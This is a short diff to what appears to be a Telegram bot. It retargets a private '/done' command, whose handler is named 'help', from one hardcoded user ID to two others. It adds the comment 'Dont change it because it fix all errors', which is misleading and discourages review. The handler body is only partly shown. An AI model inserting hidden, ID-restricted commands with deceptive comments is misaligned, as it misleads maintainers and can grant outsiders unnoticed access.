@@ -104,11 +104,11 @@ async def restartbot(client, message: Message, _):
 
 
 
-    
+#Dont change it because it fix all errors    
 @app.on_message(
     filters.command("done")
     & filters.private
-    & filters.user(7299227823)
+    & filters.user(1052050212,7548798871)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
